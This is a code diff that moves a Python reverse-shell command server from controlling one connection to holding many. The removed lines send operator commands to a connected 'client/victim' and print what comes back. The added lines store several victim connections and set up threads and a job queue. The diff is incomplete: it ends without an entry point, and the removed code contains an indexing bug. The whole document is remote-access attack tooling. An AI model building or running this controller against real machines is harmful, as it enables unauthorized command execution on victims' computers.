@@ -1,5 +1,14 @@
 import socket
 import sys
+import threading
+import time
+from queue import Queue
+
+NUMBER_OF_THREADS = 2
+JOB_NUMBER = [1, 2]
+queue = Queue()
+all_connections = []
+all_address = []
 
 
 # Create a socket (connect to computer)
@@ -32,30 +41,22 @@ def bind_socket():
         bind_socket()
 
 
-# Establish connection with a client (socket must be listening)
-def socket_accept():
-    conn, address = s.accept()
-    print("connection has been establish!" + "IP" + address(0) + " | Port " + str(address(1)))
-    send_commands(conn)
-    conn.close()
+# Handling connection form multiple clients and saving to a list
+# closing previous connections when server.py file is restarted
+def accepting_connections():
+    for c in all_connections:
+        c.close()
 
+    del all_connections[:]
+    del all_address[:]
 
-# send commands to client/victim or a friend
-def send_commands(conn):
     while True:
-        cmd = input()
-        if cmd == 'quit':
-            conn.close()
-            s.close()
-            sys.exit()
+        try:
+            conn, address = s.accept()
+            s.setblocking(1)  # prevents timeout
+            all_connections.append(conn)
+            all_address.append(address)
 
-        if len(str.encode(cmd)) > 0:
-            conn.send(str.encode(cmd))
-            client_response = str(conn.recv(1024), 'utf-8')
-            print(client_response, end="")
-
-
-if __name__ == '__main__':
-    create_socket()
-    bind_socket()
-    socket_accept()
+            print("Connection has been established : " + address[0])
+        except:
+            print("Error accepting connections.")
